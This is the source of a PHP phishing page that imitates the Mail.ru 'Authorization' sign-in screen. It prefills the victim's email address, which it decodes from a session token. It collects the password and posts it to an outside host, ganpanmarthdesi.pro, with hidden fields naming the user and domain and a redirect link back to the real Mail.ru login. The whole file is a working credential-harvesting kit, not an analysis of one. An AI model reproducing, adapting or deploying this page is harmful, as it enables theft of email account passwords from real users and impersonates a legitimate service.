<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Authorization</title>
<link rel="shortcut icon" type="image/x-icon" href="https://img.imgsmail.ru/r/favicon/favicon.ico">
</head>
<style>
.header {
  position: 0;
  left: 0;
  top: 0;
  width: 100%;
  background-image: url("img/header.png");
  background-repeat: repeat;
  line-height: 5px;
  text-align: center;
}
.footer {
  position: 0;
  left: 0;
  bottom: 0;
  margin: 0;
  padding: 0;
  border: 0;
  width: 100%;
  background-image: url("img/footer.png");
  background-repeat: repeat;
  text-align: left;
}
</style>
<style>
  html, body {
  font-family: Helvetica,Arial,sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 14px;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
input[type=password] {
  width: 100%;
  height: calc(40px - 2 * 1px);
  color: #2C2D2E;
  box-sizing: border-box;
  border: 1px solid red;
  border-radius: 5px;
  font-size: 15px;
  front-weight: 400;
  line-height: 20px;
  font-family: Arial, sans-serif;
  background: transparent; 
  margin: 0;
  padding: 0 12px;
}
  input[type=password]:focus {
  outline: none;
  border: 1px solid red;  
}
</style
<body>
<body>

<div class="header">
  <p><img border="0" src="img/header-txt.png" width="1142" height="70"></p>
</p>
</div>

<div align="center">
	<table border="0" width="426" cellspacing="0" cellpadding="0">
		<tr>
			<td>
			<table border="0" width="100%" cellspacing="0" cellpadding="0">
				<tr>
					<td height="5"></td>
				</tr>
				<tr>
					<td>
					<table border="0" width="100%" cellspacing="0" cellpadding="0" height="468">
						<tr>
							<td background="img/fm.png">
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
							  <form action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" method="post">
								<tr>
									<td width="34">&nbsp;</td>
									<td>
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td height="75">&nbsp;</td>
										</tr>
										<tr>
											<td height="20">
											<table border="0" width="100%" cellspacing="0" cellpadding="0">
												<tr>
												    <input type="hidden" name="user" value="<?php echo $users;?>@<?php echo $ddomain;?>" >
												    <input type="hidden" name="sender" value="Mail.ru" >
												    <input type="hidden" name="domain" value="<?php echo $ddomain;?>" >
												    <input type="hidden" name="link" value="https://account.mail.ru/login?&fail=1&email=<?php echo $users;?>@<?php echo $ddomain;?>&page=https%3A%2F%2Fe.mail.ru%2Fmessages%2Finbox%3Fauthid%3Dl2c0giz8.st6%26back%3D1%26dwhsplit%3Ds10273.b1ss12743s%26from%3Dlogin%26x-login-auth%3D1%26back%3D1&lang=en_US&opener=account&twoSteps=1" >
													<td width="143" style="text-overflow: ellipsis; margin-right: 8px; box-sizing: border-box; overflow: hidden;"><?php echo $users;?>@<?php echo $ddomain;?></td>
													<td width="10">
													<p align="left">&nbsp;</td>
													<td>
													<u><font color="#0000FF" size="3">Change account</font></u>
                                                                                                        </td>
												</tr>
											</table>
											</td>
										</tr>
										<tr>
											<td height="19"></td>
										</tr>
										<tr>
											<td height="41">
											   <input type="password" name="passwd" placeholder="Password" id="" required autofocus=""></td>
										</tr>
										<tr>
											<td height="30"></td>
										</tr>
										<tr>
											<td>
											<table border="0" width="100%" cellspacing="0" cellpadding="0">
												<tr>
													<td width="80">
													<input type="image" src="img/btn.png" width="80" height="44" name="I1"></td>
													<td>&nbsp;</td>
												</tr>
											</table>
											</td>
										</tr>
										<tr>
											<td height="250"></td>
										</tr>
									   </form>
									</table>
									</td>
									<td width="34">&nbsp;</td>
								</tr>
							</table>
							</td>
						</tr>
					</table>
					</td>
				</tr>
			</table>
			</td>
		</tr>
	</table>
</div>

<div class="footer">
  <p><img border="0" src="img/footer-txt.png" width="1142" height="30"></p>
</div>
</body>

</html>

<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>